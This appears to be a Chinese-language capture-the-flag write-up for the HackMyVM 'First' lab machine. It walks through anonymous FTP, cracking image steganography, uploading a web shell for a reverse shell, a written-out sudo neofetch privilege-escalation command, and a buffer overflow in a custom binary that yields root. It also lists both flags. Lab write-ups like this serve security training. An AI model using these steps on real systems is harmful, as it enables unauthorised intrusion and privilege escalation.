# First

2025.03.24 https://hackmyvm.eu/machines/machine.php?vm=First

[video]()

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

ftp 匿名登陆 first 中 first_Logo.jpg ， stegseek 爆破得到隐写密码: firstgurl1 ，解压后得到隐写文本：

```
SGkgSSBoYWQgdG8gY2hhbmdlIHRoZSBuYW1lIG9mIHRoZSB0b2RvIGxpc3QgYmVjb3VzZSBkaXJlY3RvcnkgYnVzdGluZyBpcyB0b28gZWFzeSB0aGVlc2UgZGF5cyBhbHNvIEkgZW5jb2RlZCB0aGlzIGluIGJlc2E2NCBiZWNvdXNlIGl0IGlzIGNvb2wgYnR3IHlvdXIgdG9kbyBsaXN0IGlzIDogMmYgNzQgMzAgNjQgMzAgNWYgNmMgMzEgNzMgNzQgNWYgNjYgMzAgNzIgNWYgNjYgMzEgNzIgMzUgNzQgZG8gaXQgcXVpY2sgd2UgYXJlIHZ1bG5hcmFibGUgZG8gdGhlIGZpcnN0IGZpcnN0IA==
```

```
Hi I had to change the name of the todo list becouse directory busting is too easy theese days also I encoded this in besa64 becouse it is cool btw your todo list is : 2f 74 30 64 30 5f 6c 31 73 74 5f 66 30 72 5f 66 31 72 35 74 do it quick we are vulnarable do the first first
```

hex 转换后 /t0d0_l1st_f0r_f1r5t 再次 web 目录扫描，发现http://192.168.5.40/t0d0_l1st_f0r_f1r5t/upload.php 上传文件存储在 http://192.168.5.40/t0d0_l1st_f0r_f1r5t/uploads/

上传一个 web shell，访问后得到反弹的 shell，先拿到了 user flag：

```
www-data@first:/home/first$ cat user.txt
3120a57478d631a5ef82ef5d96146389
```

sudo -l 显示 (first : first) NOPASSWD: /bin/neofetch

```
TF=$(mktemp); echo 'exec /bin/bash' > $TF; chmod +rx $TF
sudo -u first neofetch --config $TF
```

sudo -l 显示 (ALL) NOPASSWD: /bin/secret 是一个用户后添加文件，对其进行逆向。发现会出现缓冲区溢出漏洞，只要输入的字符超过 10 个就可以绕过 pass 限制。

绕过后，可以执行命令，直接 /bin/bash 拿到了 root 权限，得到 root flag:

```
root@first:~# cat r00t.txt
477d9a6aa33e3818ced1ad3015b53b43
```
